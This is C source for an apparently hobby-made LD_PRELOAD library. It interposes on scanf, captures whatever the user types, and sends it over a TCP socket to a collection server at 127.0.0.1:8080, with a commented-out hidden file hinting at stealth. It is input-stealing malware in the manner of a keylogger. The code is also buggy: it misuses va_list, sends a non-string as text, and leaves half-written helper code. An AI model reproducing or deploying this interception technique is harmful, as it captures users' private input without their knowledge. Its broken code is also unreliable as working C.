#include <stdio.h>
#include <stdarg.h>
#include <dlfcn.h>
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#define PORT 8080

#define OBJ_PATH "/lib/x86_64-linux-gnu/libc.so.6"
//#define HIDDEN_FILE ".hi"

typedef int (*sym)(const char *, ...);
void sendToServer(char* toSend);
//char*  handleArgs( char* format, va_list* arg);
void* handle;
char buffer[1024] = {0};
//FILE* fd;
static void myinit() __attribute__((constructor));
static void mydest() __attribute__((destructor));

void myinit() 
{
	//fd = fopen(HIDDEN_FILE,"w");
    handle = dlopen(OBJ_PATH,RTLD_LAZY);
}

void mydest() 
{
    dlclose(handle);
    //fclose(fd);
}

int scanf ( const char * format, ... )
{
	sym orig_scanf;

	orig_scanf = (sym)dlsym(handle,"scanf");
	va_list arg;

	va_start(arg, format);

	//va_args returns null because of orig scanf?

    int valScanf = orig_scanf(format, arg);
	
    sendToServer(arg);


	return valScanf;
}



void sendToServer(char* toSend)
{
	int sock = 0;;
	struct sockaddr_in serv_addr;
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
	{
		printf("\n Socket creation error \n");
		return -1;
	}

	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(PORT);
	
	// Convert IPv4 and IPv6 addresses from text to binary form
	if(inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr)<=0)
	{
		printf("\nInvalid address/ Address not supported \n");
		return -1;
	}

	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
	{
		printf("\nConnection Failed \n");
		return -1;
	}
	printf("sending...");
	send(sock , toSend , strlen(toSend) , 0 );
	
	
}

// char*  handleArgs(char* format, va_list* arg){

//    int d;
//    char c, *s;
//    while (*format)
//       {
//          switch (*format++) {
//       case 's':              /* string */
//             s = va_arg(*p, char *);
//             strcat(buffer, s);
//             return strdup(buffer);
//             break;
//       case 'd':              /* int */
//             d = va_arg(*p, int);
//             printf("int %d\n", d);
//             break;
//       case 'c':              /* char */
//             /* need a cast here since va_arg only
//                takes fully promoted types */
//             c = (char) va_arg(*p, int);
//             printf("char %c\n", c);
//             break;
//       }
//    }
// 	return strdup(buffer);



// }